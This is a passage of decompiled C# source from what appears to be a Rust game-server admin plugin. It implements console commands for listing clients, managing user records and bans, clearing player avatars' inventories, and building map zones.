				Broadcast.Notice(Sender, "✔", "IP Address " + Args[0] + " has unblocked.", 5f);
				if (Sender != null)
				{
					Helper.Log(string.Concat(new string[]
					{
						"\"IP address ",
						Args[0],
						"\" has unblocked by \"",
						(Sender != null) ? Sender.displayName : "SERVER",
						"\"."
					}), true);
				}
			}
		}

		public static void Clients(ConsoleSystem.Arg arg)
		{
			string text = "Total clients: " + PlayerClient.All.Count + Environment.NewLine;
			uLink.NetworkPlayer[] connections = NetCull.connections;
			for (int i = 0; i < connections.Length; i++)
			{
				uLink.NetworkPlayer player = connections[i];
				PlayerClient playerClient = Helper.GetPlayerClient(player);
				if (!(playerClient == null))
				{
					int rank = Users.GetRank(playerClient.userID);
					string text2 = "";
					if (Core.Ranks.ContainsKey(rank))
					{
						text2 = Core.Ranks[rank];
					}
					object obj = text;
					object[] array = new object[13];
					array[0] = obj;
					array[1] = "<";
					array[2] = playerClient.netPlayer.id;
					array[3] = "> - <";
					array[4] = playerClient.userID;
					array[5] = "> - <";
					array[6] = playerClient.netUser.displayName;
					array[7] = "> - <";
					array[8] = text2;
					array[9] = "> - <IP='";
					object[] array2 = array;
					int num = 10;
					uLink.NetworkPlayer networkPlayer = playerClient.netUser.networkPlayer;
					array2[num] = networkPlayer.ipAddress;
					array[11] = "'>";
					array[12] = Environment.NewLine;
					text = string.Concat(array);
				}
			}
			if (arg.argUser == null)
			{
				ConsoleSystem.Print(text, false);
			}
			else
			{
				arg.Reply = text;
				Broadcast.Message(arg.argUser, Config.GetMessage("Command.Clients", arg.argUser, null), null, 0f);
			}
		}

		public static void UserManage(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length != 0)
			{
				string text = Args[0];
				switch (text)
				{
				case "save":
					if (Core.DatabaseType.Equals("FILE"))
					{
						Users.SaveAsTextFile();
						Banned.SaveAsTextFile();
						Blocklist.SaveAsTextFile();
					}
					if (Core.DatabaseType.Equals("MYSQL"))
					{
						ConsoleSystem.Print("Paused, server saving data into MySQL", false);
						Users.SaveAsDatabaseSQL();
						ConsoleSystem.Print("  - " + Users.Loaded + " Saved User(s)", false);
						Banned.SaveAsDatabaseSQL();
						ConsoleSystem.Print("  - " + Banned.Loaded + " Saved Banned User(s)", false);
						Clans.SaveAsDatabaseSQL();
						ConsoleSystem.Print("  - " + Clans.Loaded + " Saved Clan(s)", false);
						Blocklist.SaveAsDatabaseSQL();
						ConsoleSystem.Print("  - " + Blocklist.Count + " Saved Blocked IP", false);
						ConsoleSystem.Print("Resumed.", false);
						return;
					}
					return;
				case "load":
					if (Core.DatabaseType.Equals("FILE"))
					{
						ConsoleSystem.Print("Loading User(s) from \"" + Users.SaveFilePath + "\"", false);
						Users.LoadAsTextFile();
						ConsoleSystem.Print("  - " + Users.Loaded + " Loaded User(s).", false);
						Banned.LoadAsTextFile();
						ConsoleSystem.Print("  - " + Banned.Loaded + " Banned User(s).", false);
						Blocklist.LoadAsTextFile();
					}
					if (Core.DatabaseType.Equals("MYSQL"))
					{
						ConsoleSystem.Print("Loading User(s) from MySQL Database", false);
						Users.LoadAsDatabaseSQL();
						ConsoleSystem.Print("  - " + Users.Loaded + " Loaded User(s).", false);
						Banned.LoadAsDatabaseSQL();
						ConsoleSystem.Print("  - " + Banned.Loaded + " Banned User(s).", false);
						Blocklist.LoadAsDatabaseSQL();
						return;
					}
					return;
				case "import":
					if (Args.Length < 2)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
						return;
					}
					if (Args[1].ToLower().Equals("file"))
					{
						ConsoleSystem.Print("Importing from \"" + Users.SaveFilePath + "\"", false);
						Users.LoadAsTextFile();
						ConsoleSystem.Print(Users.Loaded + " Imported User(s)", false);
						Clans.LoadAsTextFile();
						ConsoleSystem.Print(Clans.Loaded + " Imported Clan(s)", false);
						Banned.LoadAsTextFile();
						ConsoleSystem.Print(Banned.Loaded + " Imported Banned Users(s)", false);
						Blocklist.LoadAsTextFile();
						ConsoleSystem.Print(Blocklist.Count + " Imported Blocked IP", false);
						return;
					}
					if (Args[1].ToLower().Equals("mysql"))
					{
						ConsoleSystem.Print("Importing from MySQL Database", false);
						Users.LoadAsDatabaseSQL();
						ConsoleSystem.Print(Users.Loaded + " Imported User(s)", false);
						Clans.LoadAsDatabaseSQL();
						ConsoleSystem.Print(Clans.Loaded + " Imported Clan(s)", false);
						Banned.LoadAsDatabaseSQL();
						ConsoleSystem.Print(Clans.Loaded + " Imported Banned Users(s)", false);
						Blocklist.LoadAsDatabaseSQL();
						ConsoleSystem.Print(Blocklist.Count + " Imported Blocked IP", false);
						return;
					}
					Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
					return;
				case "export":
					if (Args.Length < 2)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
						return;
					}
					if (Args[1].ToLower().Equals("file"))
					{
						ConsoleSystem.Print("Exporting to \"" + Users.SaveFilePath + "\"", false);
						ConsoleSystem.Print(Users.SaveAsTextFile() + " Exported User(s)", false);
						ConsoleSystem.Print(Clans.SaveAsTextFile() + " Exported Clan(s)", false);
						ConsoleSystem.Print(Banned.SaveAsTextFile() + " Exported Banned User(s)", false);
						ConsoleSystem.Print(Blocklist.SaveAsTextFile() + " Exported Blocked IP(s)", false);
						return;
					}
					if (Args[1].ToLower().Equals("mysql"))
					{
						ConsoleSystem.Print("Exporting to MySQL Database", false);
						Users.SaveAsDatabaseSQL();
						ConsoleSystem.Print(Users.Loaded + " Exported User(s).", false);
						Clans.SaveAsDatabaseSQL();
						ConsoleSystem.Print(Clans.Loaded + " Exported Clan(s).", false);
						Banned.SaveAsDatabaseSQL();
						ConsoleSystem.Print(Banned.Loaded + " Exported Banned Users(s).", false);
						return;
					}
					Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
					return;
				case "unused":
				{
					if (Args.Length < 2)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
						return;
					}
					int num2 = 0;
					int num3 = 0;
					if (int.TryParse(Args[1], out num2))
					{
						foreach (UserData current in Users.All)
						{
							int days = (DateTime.Now - current.LastConnectDate).Days;
							if (days > num2)
							{
								string avatarFolder = ClusterServer.GetAvatarFolder(current.SteamID);
								if (Directory.Exists(avatarFolder))
								{
									Directory.Delete(avatarFolder, true);
								}
								Users.Delete(current.SteamID);
								num3++;
							}
						}
						Broadcast.Notice(Sender, "✘", "Removed " + num3 + " unused user(s).", 5f);
						return;
					}
					Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
					return;
				}
				case "count":
					Broadcast.Message(Sender, "记录用户的总数量: " + Users.Count, null, 0f);
					return;
				case "add":
				{
					if (Args.Length < 3)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
						return;
					}
					ulong num4 = 0uL;
					string text2 = Args[2];
					string password = "";
					string comments = "";
					int rank = 0;
					UserFlags flag = UserFlags.normal;
					string language = Core.Languages[0];
					string connect_ip = "127.0.0.1";
					DateTime connect_date = DateTime.Now;
					if (!ulong.TryParse(Args[1], out num4))
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
						return;
					}
					if (Users.GetBySteamID(num4) != null)
					{
						Broadcast.Notice(Sender, "✘", "User with this steam ID " + num4 + " already exists.", 5f);
						return;
					}
					if (Users.GetByUserName(text2) != null)
					{
						Broadcast.Notice(Sender, "✘", "User with this username " + text2 + " already exists.", 5f);
						return;
					}
					if (Args.Length > 3)
					{
						password = Args[3];
					}
					if (Args.Length > 4)
					{
						comments = Args[4];
					}
					if (Args.Length > 5 && !int.TryParse(Args[5], out rank))
					{
						rank = 0;
					}
					if (Args.Length > 6)
					{
						flag = Args[6].ToEnum<UserFlags>();
					}
					if (Args.Length > 7)
					{
						language = Args[7];
					}
					if (Args.Length > 8)
					{
						connect_ip = Args[8];
					}
					if (Args.Length > 9)
					{
						connect_date = DateTime.Parse(Args[9]);
					}
					Users.Add(num4, text2, password, comments, rank, flag, language, connect_ip, connect_date);
					return;
				}
				}
				if (Args.Length < 2)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
				}
				else
				{
					UserData userData2 = Users.Find(Args[0]);
					if (userData2 == null)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
					}
					else
					{
						NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
						text = Args[1].ToLower();
						switch (text)
						{
						case "del":
						case "delete":
						case "remove":
						{
							Broadcast.Notice(Sender, "✔", "User " + userData2.Username + " removed.", 5f);
							string avatarFolder2 = ClusterServer.GetAvatarFolder(userData2.SteamID);
							if (Directory.Exists(avatarFolder2))
							{
								Directory.Delete(avatarFolder2, true);
							}
							Users.Delete(userData2.SteamID);
							return;
						}
						case "id":
						{
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, string.Concat(new object[]
								{
									"用户 ",
									userData2.SteamID,
									" 设置ID为: ",
									userData2.SteamID
								}), null, 0f);
								return;
							}
							ulong num5 = 0uL;
							if (!ulong.TryParse(Args[2], out num5) || num5 <= 76560000000000000uL)
							{
								Broadcast.Notice(Sender, "✘", "Invalid new steam ID for change", 5f);
								return;
							}
							if (Users.Database.ContainsKey(num5))
							{
								Broadcast.Notice(Sender, "✘", "User with steam ID " + num5 + " already exists", 5f);
								return;
							}
							if (Users.ChangeID(userData2.SteamID, num5))
							{
								Broadcast.Notice(Sender, "✔", string.Concat(new object[]
								{
									"Steam ID for ",
									userData2.Username,
									" changed on ",
									num5
								}), 5f);
								return;
							}
							Broadcast.Notice(Sender, "✘", "Unknown Error!", 5f);
							return;
						}
						case "username":
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, "用户 " + userData2.Username + " 使用用户名: " + userData2.Username, null, 0f);
								return;
							}
							Broadcast.Notice(Sender, "✔", "You set new user name for " + userData2.Username + ", now name is " + Args[2], 5f);
							Users.SetUsername(userData2.SteamID, Args[2]);
							return;
						case "password":
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, "用户 " + userData2.Username + " 密码: " + userData2.Password, null, 0f);
								return;
							}
							Broadcast.Notice(Sender, "✔", "您可以设置新密码 " + userData2.Username, 5f);
							Users.SetPassword(userData2.SteamID, Args[2]);
							return;
						case "rank":
						{
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, string.Concat(new object[]
								{
									"用户 ",
									userData2.Username,
									" 权限: ",
									userData2.Rank
								}), null, 0f);
								return;
							}
							int rank2 = userData2.Rank;
							if (!int.TryParse(Args[2], out rank2) || !Core.Ranks.ContainsKey(rank2))
							{
								Broadcast.Notice(Sender, "✘", "Invalid argument, rank " + Args[2] + " not exists.", 5f);
								return;
							}
							string text3 = Core.Ranks[rank2];
							if (text3 == "")
							{
								text3 = rank2.ToString();
							}
							if (!Core.Ranks.ContainsKey(rank2))
							{
								Broadcast.Notice(Sender, "✔", "Rank " + rank2 + " not exists.", 5f);
								return;
							}
							if (netUser != Sender || Sender == null)
							{
								Broadcast.Notice(Sender, "✔", "You set '" + text3 + "' rank for " + userData2.Username, 5f);
							}
							if (netUser != null)
							{
								Broadcast.Notice(netUser, "✔", "You now have rank is '" + text3 + "'", 5f);
							}
							Users.SetFlags(userData2.SteamID, UserFlags.godmode, rank2 >= Users.AutoAdminRank && Core.AdminGodmode);
							Users.SetFlags(userData2.SteamID, UserFlags.premium, userData2.PremiumDate.Ticks > 0L);
							Users.SetFlags(userData2.SteamID, UserFlags.admin, rank2 >= Users.AutoAdminRank);
							Users.SetFlags(userData2.SteamID, UserFlags.invis, false);
							if (netUser != null)
							{
								netUser.admin = userData2.HasFlag(UserFlags.admin);
							}
							Users.SetRank(userData2.SteamID, rank2);
							return;
						}
						case "flags":
							Broadcast.Message(Sender, string.Concat(new object[]
							{
								"User ",
								userData2.Username,
								" with flags: ",
								userData2.Flags
							}), null, 0f);
							return;
						case "flag":
							if (Args.Length < 3)
							{
								return;
							}
							text = Args[2].ToLower();
							switch (text)
							{
							case "normal":
								Users.ToggleFlag(userData2.SteamID, UserFlags.normal);
								Broadcast.Notice(Sender, "✔", "Flag 'normal' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.normal) ? "enabled" : "disabled"), 5f);
								return;
							case "premium":
								Users.ToggleFlag(userData2.SteamID, UserFlags.premium);
								Broadcast.Notice(Sender, "✔", "Flag 'premium' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.premium) ? "enabled" : "disabled"), 5f);
								return;
							case "whitelisted":
								Users.ToggleFlag(userData2.SteamID, UserFlags.whitelisted);
								Broadcast.Notice(Sender, "✔", "Flag 'whitelisted' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.whitelisted) ? "enabled" : "disabled"), 5f);
								return;
							case "banned":
								Users.ToggleFlag(userData2.SteamID, UserFlags.banned);
								Broadcast.Notice(Sender, "✔", "Flag 'banned' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.banned) ? "enabled" : "disabled"), 5f);
								return;
							case "admin":
								Users.ToggleFlag(userData2.SteamID, UserFlags.admin);
								Broadcast.Notice(Sender, "✔", "Flag 'admin' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.admin) ? "enabled" : "disabled"), 5f);
								return;
							case "nopvp":
								Users.ToggleFlag(userData2.SteamID, UserFlags.nopvp);
								Broadcast.Notice(Sender, "✔", "Flag 'nopvp' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.nopvp) ? "enabled" : "disabled"), 5f);
								return;
							case "safeboxes":
								Users.ToggleFlag(userData2.SteamID, UserFlags.safeboxes);
								Broadcast.Notice(Sender, "✔", "Flag 'safeboxes' for " + userData2.Username + " has been " + (userData2.HasFlag(UserFlags.safeboxes) ? "enabled" : "disabled"), 5f);
								return;
							}
							Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
							return;
						case "comments":
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, "User " + userData2.Username + " with comments: " + userData2.Comments, null, 0f);
								return;
							}
							Users.SetComments(userData2.SteamID, Args[2]);
							Broadcast.Notice(Sender, "✔", "You update comments for " + userData2.Username, 5f);
							return;
						case "violations":
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, string.Concat(new object[]
								{
									"User ",
									userData2.Username,
									" with violations: ",
									userData2.Violations
								}), null, 0f);
								return;
							}
							Users.SetViolations(userData2.SteamID, int.Parse(Args[2]));
							Broadcast.Notice(Sender, "✔", "You update violations for " + userData2.Username, 5f);
							return;
						case "countdowns":
						{
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, string.Concat(new object[]
								{
									"User ",
									userData2.Username,
									" with countdowns: ",
									Users.CountdownList(userData2.SteamID).Count<Countdown>()
								}), null, 0f);
								return;
							}
							string a;
							if ((a = Args[2].ToLower()) != null && a == "clear")
							{
								Users.CountdownsClear(userData2.SteamID);
								Broadcast.Notice(Sender, "✔", "All countdowns cleared for " + userData2.Username, 5f);
								return;
							}
							Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
							return;
						}
						case "personal":
						{
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, string.Concat(new object[]
								{
									"User ",
									userData2.Username,
									" have personals: ",
									Users.PersonalList(userData2.SteamID).Count<KeyValuePair<string, int>>()
								}), null, 0f);
								return;
							}
							string a2;
							if ((a2 = Args[2].ToLower()) != null && a2 == "clear")
							{
								Users.CountdownsClear(userData2.SteamID);
								Broadcast.Notice(Sender, "✔", "All personal items cleared for " + userData2.Username, 5f);
								return;
							}
							Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
							return;
						}
						case "ip":
							if (Args.Length < 3)
							{
								Broadcast.Message(Sender, "User " + userData2.Username + " with ip: " + userData2.LastConnectIP, null, 0f);
								return;
							}
							if (!Regex.IsMatch(Args[2], "^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$"))
							{
								Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
								return;
							}
							Users.SetLastConnectIP(userData2.SteamID, Args[2]);
							Users.SetFirstConnectIP(userData2.SteamID, Args[2]);
							Broadcast.Notice(Sender, "✔", "You update first IP address for " + userData2.Username, 5f);
							return;
						}
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
					}
				}
			}
			else
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
		}

		public static void Avatars(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length != 0)
			{
				string[] directories = Directory.GetDirectories(server.datadir + "userdata/");
				RustProto.Avatar avatar = null;
				ulong num = 0uL;
				int num2 = 0;
				string a;
				if ((a = Args[0].ToLower()) != null)
				{
					if (a == "unused")
					{
						string[] array = directories;
						for (int i = 0; i < array.Length; i++)
						{
							string text = array[i];
							if (ulong.TryParse(Path.GetFileName(text), out num) && Users.GetBySteamID(num) == null)
							{
								Helper.Log("Unused avatar \"" + text + "\" has been removed.", false);
								Directory.Delete(text, true);
								num2++;
							}
						}
						Broadcast.Notice(Sender, "✘", "Removed " + num2 + " unused avatar folder(s).", 5f);
						return;
					}
					if (a == "clear")
					{
						if (Args.Length < 2)
						{
							Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
							return;
						}
						string key;
						if ((key = Args[1].ToLower()) == null)
						{
							return;
						}
						if (Commands.asdasf == null)
						{
							Commands.asdasf = new Dictionary<string, int>(9)
							{
								{
									"all",
									0
								},
								{
									"*",
									1
								},
								{
									"inventory",
									2
								},
								{
									"inv",
									3
								},
								{
									"wearable",
									4
								},
								{
									"wear",
									5
								},
								{
									"belt",
									6
								},
								{
									"blueprint",
									7
								},
								{
									"bp",
									8
								}
							};
						}
						int num3;
						if (!Commands.asdasf.TryGetValue(key, out num3))
						{
							return;
						}
						switch (num3)
						{
						case 0:
						case 1:
						{
							string[] array2 = directories;
							for (int j = 0; j < array2.Length; j++)
							{
								string text2 = array2[j];
								if (ulong.TryParse(Path.GetFileName(text2), out num))
								{
									avatar = (Users.Avatar.ContainsKey(num) ? Users.Avatar[num] : RustHook.ClusterServer_LoadAvatar(num));
									if (avatar != null)
									{
										using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler = RustProto.Avatar.Recycler())
										{
											RustProto.Avatar.Builder builder = recycler.OpenBuilder();
											if (avatar.HasPos)
											{
												builder.SetPos(avatar.Pos);
											}
											if (avatar.HasAng)
											{
												builder.SetAng(avatar.Ang);
											}
											if (avatar.HasVitals)
											{
												builder.SetVitals(avatar.Vitals.ToBuilder());
											}
											if (avatar.HasAwayEvent)
											{
												builder.SetAwayEvent(avatar.AwayEvent);
											}
											builder.ClearBlueprints();
											builder.ClearInventory();
											builder.ClearWearable();
											builder.ClearBelt();
											avatar = builder.Build();
											RustHook.ClusterServer_SaveAvatar(num, ref avatar);
											if (Users.Avatar.ContainsKey(num))
											{
												Users.Avatar[num] = avatar;
											}
											Helper.Log("Avatar \"" + text2 + "\" has been cleared.", true);
											num2++;
										}
									}
								}
							}
							Broadcast.Notice(Sender, "✘", "Cleared " + num2 + " avatar(s).", 5f);
							return;
						}
						case 2:
						case 3:
						{
							string[] array3 = directories;
							for (int k = 0; k < array3.Length; k++)
							{
								string text3 = array3[k];
								if (ulong.TryParse(Path.GetFileName(text3), out num))
								{
									avatar = (Users.Avatar.ContainsKey(num) ? Users.Avatar[num] : RustHook.ClusterServer_LoadAvatar(num));
									if (avatar != null)
									{
										using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler2 = RustProto.Avatar.Recycler())
										{
											RustProto.Avatar.Builder builder2 = recycler2.OpenBuilder();
											if (avatar.HasPos)
											{
												builder2.SetPos(avatar.Pos);
											}
											if (avatar.HasAng)
											{
												builder2.SetAng(avatar.Ang);
											}
											if (avatar.HasVitals)
											{
												builder2.SetVitals(avatar.Vitals.ToBuilder());
											}
											if (avatar.HasAwayEvent)
											{
												builder2.SetAwayEvent(avatar.AwayEvent);
											}
											builder2.ClearBlueprints();
											builder2.ClearInventory();
											builder2.ClearWearable();
											builder2.ClearBelt();
											for (int l = 0; l < avatar.BlueprintsCount; l++)
											{
												builder2.AddBlueprints(avatar.GetBlueprints(l));
											}
											avatar = builder2.Build();
											RustHook.ClusterServer_SaveAvatar(num, ref avatar);
											if (Users.Avatar.ContainsKey(num))
											{
												Users.Avatar[num] = avatar;
											}
											Helper.Log("Inventory of avatar \"" + text3 + "\" has been cleared.", true);
											num2++;
										}
									}
								}
							}
							Broadcast.Notice(Sender, "✘", "Cleared inventory of " + num2 + " avatar(s).", 5f);
							return;
						}
						case 4:
						case 5:
						{
							string[] array4 = directories;
							for (int m = 0; m < array4.Length; m++)
							{
								string text4 = array4[m];
								if (ulong.TryParse(Path.GetFileName(text4), out num))
								{
									avatar = (Users.Avatar.ContainsKey(num) ? Users.Avatar[num] : RustHook.ClusterServer_LoadAvatar(num));
									if (avatar != null)
									{
										using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler3 = RustProto.Avatar.Recycler())
										{
											RustProto.Avatar.Builder builder3 = recycler3.OpenBuilder();
											if (avatar.HasPos)
											{
												builder3.SetPos(avatar.Pos);
											}
											if (avatar.HasAng)
											{
												builder3.SetAng(avatar.Ang);
											}
											if (avatar.HasVitals)
											{
												builder3.SetVitals(avatar.Vitals.ToBuilder());
											}
											if (avatar.HasAwayEvent)
											{
												builder3.SetAwayEvent(avatar.AwayEvent);
											}
											builder3.ClearBlueprints();
											builder3.ClearInventory();
											builder3.ClearWearable();
											builder3.ClearBelt();
											for (int n = 0; n < avatar.BlueprintsCount; n++)
											{
												builder3.AddBlueprints(avatar.GetBlueprints(n));
											}
											for (int num4 = 0; num4 < avatar.InventoryCount; num4++)
											{
												builder3.AddInventory(avatar.GetInventory(num4));
											}
											for (int num5 = 0; num5 < avatar.BeltCount; num5++)
											{
												builder3.AddBelt(avatar.GetBelt(num5));
											}
											avatar = builder3.Build();
											RustHook.ClusterServer_SaveAvatar(num, ref avatar);
											if (Users.Avatar.ContainsKey(num))
											{
												Users.Avatar[num] = avatar;
											}
											Helper.Log("Wearable of avatar \"" + text4 + "\" has been cleared.", true);
											num2++;
										}
									}
								}
							}
							Broadcast.Notice(Sender, "✘", "Cleared wearable of " + num2 + " avatar(s).", 5f);
							return;
						}
						case 6:
						{
							string[] array5 = directories;
							for (int num6 = 0; num6 < array5.Length; num6++)
							{
								string text5 = array5[num6];
								if (ulong.TryParse(Path.GetFileName(text5), out num))
								{
									avatar = (Users.Avatar.ContainsKey(num) ? Users.Avatar[num] : RustHook.ClusterServer_LoadAvatar(num));
									if (avatar != null)
									{
										using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler4 = RustProto.Avatar.Recycler())
										{
											RustProto.Avatar.Builder builder4 = recycler4.OpenBuilder();
											if (avatar.HasPos)
											{
												builder4.SetPos(avatar.Pos);
											}
											if (avatar.HasAng)
											{
												builder4.SetAng(avatar.Ang);
											}
											if (avatar.HasVitals)
											{
												builder4.SetVitals(avatar.Vitals.ToBuilder());
											}
											if (avatar.HasAwayEvent)
											{
												builder4.SetAwayEvent(avatar.AwayEvent);
											}
											builder4.ClearBlueprints();
											builder4.ClearInventory();
											builder4.ClearWearable();
											builder4.ClearBelt();
											for (int num7 = 0; num7 < avatar.BlueprintsCount; num7++)
											{
												builder4.AddBlueprints(avatar.GetBlueprints(num7));
											}
											for (int num8 = 0; num8 < avatar.InventoryCount; num8++)
											{
												builder4.AddInventory(avatar.GetInventory(num8));
											}
											for (int num9 = 0; num9 < avatar.WearableCount; num9++)
											{
												builder4.AddWearable(avatar.GetWearable(num9));
											}
											avatar = builder4.Build();
											RustHook.ClusterServer_SaveAvatar(num, ref avatar);
											if (Users.Avatar.ContainsKey(num))
											{
												Users.Avatar[num] = avatar;
											}
											Helper.Log("Belt of avatar \"" + text5 + "\" has been cleared.", true);
											num2++;
										}
									}
								}
							}
							Broadcast.Notice(Sender, "✘", "Cleared belt of " + num2 + " avatar(s).", 5f);
							return;
						}
						case 7:
						case 8:
						{
							string[] array6 = directories;
							for (int num10 = 0; num10 < array6.Length; num10++)
							{
								string text6 = array6[num10];
								if (ulong.TryParse(Path.GetFileName(text6), out num))
								{
									avatar = (Users.Avatar.ContainsKey(num) ? Users.Avatar[num] : RustHook.ClusterServer_LoadAvatar(num));
									if (avatar != null)
									{
										using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler5 = RustProto.Avatar.Recycler())
										{
											RustProto.Avatar.Builder builder5 = recycler5.OpenBuilder();
											if (avatar.HasPos)
											{
												builder5.SetPos(avatar.Pos);
											}
											if (avatar.HasAng)
											{
												builder5.SetAng(avatar.Ang);
											}
											if (avatar.HasVitals)
											{
												builder5.SetVitals(avatar.Vitals.ToBuilder());
											}
											if (avatar.HasAwayEvent)
											{
												builder5.SetAwayEvent(avatar.AwayEvent);
											}
											builder5.ClearBlueprints();
											builder5.ClearInventory();
											builder5.ClearWearable();
											builder5.ClearBelt();
											for (int num11 = 0; num11 < avatar.InventoryCount; num11++)
											{
												builder5.AddInventory(avatar.GetInventory(num11));
											}
											for (int num12 = 0; num12 < avatar.WearableCount; num12++)
											{
												builder5.AddWearable(avatar.GetWearable(num12));
											}
											for (int num13 = 0; num13 < avatar.BeltCount; num13++)
											{
												builder5.AddBelt(avatar.GetBelt(num13));
											}
											avatar = builder5.Build();
											RustHook.ClusterServer_SaveAvatar(num, ref avatar);
											if (Users.Avatar.ContainsKey(num))
											{
												Users.Avatar[num] = avatar;
											}
											Helper.Log("Blueprints of avatar \"" + text6 + "\" has been cleared.", true);
											num2++;
										}
									}
								}
							}
							Broadcast.Notice(Sender, "✘", "Cleared blueprints of " + num2 + " avatar(s).", 5f);
							return;
						}
						default:
							return;
						}
					}
				}
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
		}

		public static void Zone(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			WorldZone worldZone = Zones.Get(Sender.playerClient);
			if (Args != null && Args.Length > 0)
			{
				if (Args[0].ToUpper().Equals("HIDE"))
				{
					Broadcast.Message(Sender, "所有区域的标记物已被除去.", null, 0f);
					Zones.HidePoints();
					return;
				}
				if (Args[0].ToUpper().Equals("SHOW"))
				{
					Zones.HidePoints();
					foreach (WorldZone current in Zones.All.Values)
					{
						Zones.ShowPoints(current);
					}
					Broadcast.Message(Sender, "已创建的所有区域的标记.", null, 0f);
					return;
				}
				if (Args[0].ToUpper().Equals("LIST"))
				{
					Broadcast.Message(Sender, "List of zones:", null, 0f);
					foreach (string current2 in Zones.All.Keys)
					{
						Broadcast.Message(Sender, Zones.All[current2].Name + " (" + current2 + ")", null, 0f);
					}
					return;
				}
				if (Args[0].ToUpper().Equals("SAVE"))
				{
					Zones.SaveAsFile();
					Broadcast.Message(Sender, "All zones saved.", null, 0f);
					return;
				}
				if (Args[0].ToUpper().Equals("LOAD"))
				{
					Zones.LoadAsFile();
					Broadcast.Message(Sender, "All zones reloaded.", null, 0f);
					return;
				}
				worldZone = Zones.Find(Args[0]);
			}
			if (Args.Length > 1)
			{
				string text = Args[1].ToUpper().Trim();
				string text2 = text;
				switch (text2)
				{
				case "NEW":
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "You cannot create new zone because have not completed previous zone.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save a previous not completed zone.", null, 0f);
						return;
					}
					if (Zones.BuildNew(Args[0]))
					{
						Broadcast.Notice(Sender, "✎", "You starting to create " + Zones.LastZone.Name + " zone", 5f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" mark\" to adding point for zone.", null, 0f);
						return;
					}
					Broadcast.Message(Sender, "Zone with name \"" + Args[0] + "\" already exists.", null, 0f);
					return;
				case "POINT":
				case "MARK":
					if (Zones.IsBuild)
					{
						Zones.BuildMark(Sender.playerClient.lastKnownPosition);
						Broadcast.Notice(Sender, "✎", "Point was added for \"" + Zones.LastZone.Name + "\" zone", 5f);
						return;
					}
					Broadcast.Message(Sender, "You cannot mark point because you not in creating zone.", null, 0f);
					Broadcast.Message(Sender, "Use \"/zone <name> new\" for start creating new zone.", null, 0f);
					return;
				case "SAVE":
				{
					if (!Zones.IsBuild)
					{
						Broadcast.Message(Sender, "You cannot save zone because you not in creating zone.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone <name> new\" for start creating new zone.", null, 0f);
						return;
					}
					string name = Zones.LastZone.Name;
					if (Zones.BuildSave())
					{
						Broadcast.Notice(Sender, "✎", "Zone \"" + name + "\" a successfully created.", 5f);
						return;
					}
					Broadcast.Notice(Sender, "✎", "Error of creation zone \"" + name + "\", no points.", 5f);
					return;
				}
				case "SHOW":
					if (!Zones.IsBuild && worldZone != null)
					{
						Zones.ShowPoints(worldZone);
						return;
					}
					return;
				case "GO":
				{
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
						return;
					}
